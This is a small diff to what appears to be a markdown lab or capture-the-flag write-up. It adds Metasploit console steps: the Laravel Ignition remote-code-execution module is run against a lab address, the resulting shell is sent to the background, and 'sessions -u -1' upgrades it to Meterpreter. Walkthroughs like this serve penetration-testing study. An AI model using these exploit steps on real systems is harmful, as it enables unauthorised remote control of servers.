@@ -154,5 +154,10 @@ run rhost=10.10.40.65 lhost=OUR_IP HttpClientTimeout=20
 
 To upgrade the session to Meterpreter, use the `sessions -u -1` command.
 ```Metasploit
+background
 
+Background session 1? [y/N]  y
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions -u -1
 ```
+![[Pasted image 20221210104759.png]]
+
